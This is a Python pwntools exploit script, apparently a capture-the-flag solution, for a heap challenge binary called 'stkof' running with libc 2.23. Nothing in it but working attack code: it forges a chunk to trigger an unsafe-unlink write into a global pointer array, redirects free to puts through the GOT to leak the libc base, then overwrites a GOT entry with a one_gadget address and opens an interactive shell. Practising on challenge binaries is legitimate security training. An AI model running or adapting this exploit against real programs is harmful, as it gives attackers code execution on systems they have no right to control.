from pwn import *

elf=ELF('./stkof')
env={'LD_PRELOAD':'/home/thefox/chall1/libc-2.23.so'}
p=process(['./stkof'],env=env)
libc = ELF('./libc-2.23.so')
#pause()
gdb.attach(p, 'init-gef\n b malloc')


def create(size):
	p.sendline('1')
	p.sendline(str(size))
	val = int(p.recvline()[:-1])
	p.recv()
	return val

def givedata(index,data):
	p.sendline('2')
	p.sendline(str(index))
	p.sendline(str(len(data)))
	p.send(data)
	p.recv()

def free(index):
	p.sendline('3')
	p.sendline(str(index))
	return p.recv()

def ptrarray(index):
	return 0x602140 + 8*index

free(1)
chunk_size = 0x80
chunk_real_size=0x90

A = create(chunk_size)
B = create(chunk_size)

payload = p64(0) + p64(chunk_size + 1) + p64(ptrarray(A)-8*3) + p64(ptrarray(A)-8*2)

payload = payload.ljust(chunk_size,'\x00')

givedata(A,payload + p64(chunk_size) + p64(chunk_real_size))

free(B)

payload = "\x00"*(8*3)
payload  += p64(elf.got['free']) + p64(elf.got['puts']) + p64(elf.got['free'])
givedata(A,payload)

givedata(A,p64(elf.plt['puts']))

leak = free(B)[:6]
libc.address = u64(leak.ljust(8,'\x00')) - libc.symbols['puts']
log.success('Libc: 0x{:x}'.format(libc.address))
one_gadget = libc.address + 0xef9f4

givedata(B+1,p64(one_gadget))

p.sendline('3')
p.sendline(str(B+1))

p.interactive()
